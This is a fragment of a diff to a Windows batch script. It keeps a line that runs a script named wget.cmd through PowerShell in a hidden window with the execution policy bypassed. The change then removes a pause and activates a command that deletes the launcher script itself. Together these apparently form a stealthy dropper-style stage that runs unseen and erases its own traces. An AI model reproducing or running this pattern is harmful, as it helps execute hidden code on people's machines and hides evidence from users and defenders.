@@ -28,6 +28,6 @@ powershell -windowstyle hidden -ExecutionPolicy Bypass ./wget.cmd
 
 @REM cd back into initial location
 cd "%INITIALPATH%"
-pause
+
 @REM self delete
-@rem del initial.cmd
+del initial.cmd
